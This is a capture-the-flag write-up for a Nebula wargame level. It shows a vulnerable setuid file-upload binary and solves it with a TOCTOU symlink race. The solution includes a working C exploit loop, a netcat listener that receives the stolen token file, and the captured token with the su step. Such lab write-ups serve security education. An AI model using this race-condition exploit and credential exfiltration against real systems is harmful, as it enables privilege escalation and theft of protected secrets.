# level10

## Challenge info

The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.

```
int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending file .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```
## Solution

This challenge seems to be a TOCTOU type of race condition because it checks the permissions right away and after many instructions it reads (it is also referenced at NOTES section in the access man page).

The first approach will be creating a script that creates a soft sym link to a dummy file, run the program and put it in the background, change the link and do again until it get access.

Since it takes some lines of code to open the passed file, the exploit hits easily without many tries.

The exploit (at /tmp folder) <b>!!! The & at the end of the system call that execute the script is extremely important otherwise the symlink is changed only after transmission) !!! </b>
```
#include <stdio.h>

int main(){
    int nTrys = 1000;
    system("touch dummy");
    while(nTrys-- > 0){
        system("ln -sf dummy sym");
        system("/home/flag10/flag10 sym $IP &");
        system("ln -sf /home/flag10/token sym");
    }
}
compile: gcc rc.c -o rc
```

Need to listen at IP (at another terminal tab)
```
nc -lvk 18211 > logger
```

Run rc at the first tab
```
./rc 
```

the token 
```
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
su flag10
Password: (token here)
getflag
```


## Flag
```
You have successfully executed getflag on a target account
```
